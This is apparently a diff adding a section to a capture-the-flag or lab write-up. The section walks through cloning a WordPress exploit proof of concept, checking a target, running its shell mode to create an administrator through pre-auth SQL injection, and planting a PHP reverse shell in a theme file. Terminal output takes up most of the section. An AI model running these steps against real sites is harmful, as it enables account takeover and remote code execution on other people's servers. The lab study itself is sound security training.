@@ -1176,3 +1176,53 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 34.23 seconds
 root@ip-10-64-82-12:~# 
 ```
+### Access the WordPress administrative portal
+
+root@ip-10-64-79-160:~# git clone https://github.com/Icex0/wp2shell-poc
+Cloning into 'wp2shell-poc'...
+remote: Enumerating objects: 130, done.
+remote: Counting objects: 100% (130/130), done.
+remote: Compressing objects: 100% (86/86), done.
+remote: Total 130 (delta 80), reused 91 (delta 42), pack-reused 0 (from 0)
+Receiving objects: 100% (130/130), 356.82 KiB | 11.89 MiB/s, done.
+Resolving deltas: 100% (80/80), done.
+
+
+root@ip-10-64-79-160:~# ls
+CTFBuilder  Downloads  Rooms      go              reports       wp2shell-poc
+Desktop     Pictures   Scripts    neoreg_servers  snap
+Documents   Postman    Templates  pythoncode.py   test-reports
+
+
+root@ip-10-64-79-160:~# cd wp2shell-poc/
+
+root@ip-10-64-79-160:~/wp2shell-poc# ls
+LICENSE  README.md  docs  pyproject.toml  wp2shell  wp2shell.py
+
+root@ip-10-64-79-160:~/wp2shell-poc# python3 wp2shell.py check http://10.64.149.207/wp-trackback.php
+[*] WordPress markers found (wp-json)
+[!] No public WordPress version hints found.
+[*] Batch probe -> HTTP 207; markers matched: parse_path_failed, block_cannot_read, rest_batch_not_allowed
+[+] VULNERABLE — batch route-confusion behavior detected.
+[*] SQLi confirmation not sent; use --confirm-sqli for the active SQLi probe.
+
+root@ip-10-64-79-160:~/wp2shell-poc# python3 wp2shell.py shell http://10.64.149.207/wp-trackback.php -i
+[!] This uploads a plugin containing a webshell to the target.
+[!] No credentials supplied; attempting pre-auth administrator creation.
+[*] Creating administrator through the SQLi-to-customizer bridge...
+[+] Administrator created: wp2_cd131e5ed944
+[+]     email:    wp2_cd131e5ed944@wp2shell.invalid
+[+]     password: Wp2!cfmHwIFJrzIJFLZ9UUX_
+[*] Authenticating as 'wp2_cd131e5ed944'...
+[-] HTTP Error 404: Not Found
+root@ip-10-64-79-160:~/wp2shell-poc# 
+
+This allows access to the /wp-admin portal
+
+- Use password and user@emailaddress to sign into wp-admin then, under Tools>theme file editor>then search for contact-info-locations.php on the right side of site. 
+- Enter the code from revshells using php and start reverse shell. 
+- Then access it with, assuming netcat listener configured ready to connect.
+```
+http://TargetIP/wp-content/themes/twentytwentyfive/patterns/contact-info-locations.php
+```
+This automatically connects to reverse shell.
